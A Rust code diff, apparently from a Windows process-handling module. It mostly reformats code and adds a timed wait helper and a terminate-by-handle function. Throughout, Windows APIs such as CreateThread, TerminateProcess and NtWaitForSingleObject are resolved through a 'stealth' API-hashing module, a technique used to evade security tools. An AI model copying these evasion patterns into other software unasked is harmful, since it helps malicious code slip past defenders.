@@ -216,7 +216,11 @@ pub(crate) fn parse_system_process_info(buf: &[u8]) -> Result<Vec<ProcessInfo>, 
     while guard < max_entries {
         guard += 1;
 
-        if offset.checked_add(need).map(|e| e > buf.len()).unwrap_or(true) {
+        if offset
+            .checked_add(need)
+            .map(|e| e > buf.len())
+            .unwrap_or(true)
+        {
             break;
         }
 
@@ -378,8 +382,7 @@ fn list_processes_win32() -> Result<Vec<ProcessInfo>, String> {
             return Err("kernel32 not found".into());
         }
 
-        type CreateSnap =
-            unsafe extern "system" fn(u32, u32) -> usize;
+        type CreateSnap = unsafe extern "system" fn(u32, u32) -> usize;
         type Process32FirstW = unsafe extern "system" fn(usize, *mut ProcessEntry32W) -> i32;
         type Process32NextW = unsafe extern "system" fn(usize, *mut ProcessEntry32W) -> i32;
         type CloseHandleFn = unsafe extern "system" fn(usize) -> i32;
@@ -657,10 +660,14 @@ pub fn create_thread_ex(
                 *mut u32,
             ) -> usize;
             let ct: CreateThreadFn = std::mem::transmute(
-                stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateThread"))
-                    .ok_or_else(|| {
-                        format!("NtCreateThreadEx 0x{:08X}; CreateThread unresolved", status as u32)
-                    })?,
+                stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateThread")).ok_or_else(
+                    || {
+                        format!(
+                            "NtCreateThreadEx 0x{:08X}; CreateThread unresolved",
+                            status as u32
+                        )
+                    },
+                )?,
             );
             // CreateThread: 0 = default; non-zero = commit size (fine without reserve).
             let h = ct(
@@ -682,12 +689,17 @@ pub fn create_thread_ex(
     })
 }
 
-/// NtWaitForSingleObject(handle, FALSE, NULL) — wait forever.
+/// Wait forever. Returns 0 if signaled (WAIT_OBJECT_0), non-zero otherwise.
 pub fn wait_for_single_object(handle: usize) -> i32 {
-    let status = unsafe { invoke_nt(b"NtWaitForSingleObject", &[handle, 0, 0]) };
-    if status != -1 {
-        return status;
+    if wait_for_single_object_timeout(handle, 0xFFFF_FFFF) {
+        0
+    } else {
+        1
     }
+}
+
+/// Wait up to `timeout_ms` (0xFFFFFFFF = infinite). Returns true if signaled.
+pub fn wait_for_single_object_timeout(handle: usize, timeout_ms: u32) -> bool {
     unsafe {
         let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
         if let Some(addr) =
@@ -695,10 +707,32 @@ pub fn wait_for_single_object(handle: usize) -> i32 {
         {
             type WaitFn = unsafe extern "system" fn(usize, u32) -> u32;
             let wait: WaitFn = std::mem::transmute(addr);
-            return wait(handle, 0xFFFF_FFFF) as i32; // INFINITE
+            // WAIT_OBJECT_0 = 0, WAIT_TIMEOUT = 258
+            return wait(handle, timeout_ms) == 0;
         }
     }
-    -1
+    if timeout_ms == 0xFFFF_FFFF {
+        let status = unsafe { invoke_nt(b"NtWaitForSingleObject", &[handle, 0, 0]) };
+        return status == 0;
+    }
+    false
+}
+
+/// Terminate by process handle (not PID).
+pub fn terminate_process_handle(handle: usize) -> Result<(), String> {
+    unsafe {
+        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
+        if let Some(addr) = stealth::get_api_addr(k32, stealth::hash_api_name(b"TerminateProcess"))
+        {
+            type Term = unsafe extern "system" fn(usize, u32) -> i32;
+            let f: Term = std::mem::transmute(addr);
+            if f(handle, 1) == 0 {
+                return Err("TerminateProcess failed".into());
+            }
+            return Ok(());
+        }
+    }
+    Err("TerminateProcess unavailable".into())
 }
 
 // ─── Unit tests (pure buffer parse — no Windows APIs required) ───────────────
@@ -744,11 +778,7 @@ mod tests {
         write_usize(&mut buf, o + ppid_off, 1234);
         write_u16(&mut buf, o + name_off, (name2.len() * 2) as u16);
         write_u16(&mut buf, o + name_off + 2, (name2.len() * 2) as u16);
-        write_usize(
-            &mut buf,
-            o + name_off + buf_in_us,
-            name2.as_ptr() as usize,
-        );
+        write_usize(&mut buf, o + name_off + buf_in_us, name2.as_ptr() as usize);
 
         let list = parse_system_process_info(&buf).expect("parse");
         assert_eq!(list.len(), 2);
